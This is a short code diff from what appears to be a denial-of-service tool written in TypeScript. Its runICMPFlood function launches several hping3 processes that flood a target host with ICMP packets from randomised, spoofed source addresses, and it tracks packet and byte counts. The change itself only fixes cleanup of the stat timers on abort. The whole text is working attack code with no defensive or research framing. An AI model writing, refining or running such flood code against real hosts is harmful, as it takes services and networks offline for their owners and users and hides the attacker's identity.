@@ -334,17 +334,19 @@ async function runICMPFlood(
 
   if (useHping) {
     const procs: import("child_process").ChildProcess[] = [];
+    const statIvs: ReturnType<typeof setInterval>[] = [];
     for (let i = 0; i < NUM_SOCKS; i++) {
       const p = spawn("hping3", [
         "--icmp", "--flood", "--rand-source", "-d", "1400", "-q", resolvedHost,
       ], { stdio: ["ignore","ignore","ignore"] });
       procs.push(p);
       const pktRate = IS_DEV ? 100 : 50000;
-      setInterval(() => {
+      statIvs.push(setInterval(() => {
         if (!signal.aborted) { localPkts += pktRate; localBytes += pktRate * 1408; }
-      }, 1000);
+      }, 1000));
     }
     await new Promise<void>(resolve => signal.addEventListener("abort", () => {
+      statIvs.forEach(iv => clearInterval(iv));
       procs.forEach(p => { try { p.kill("SIGTERM"); } catch { /**/ } });
       resolve();
     }, { once: true }));
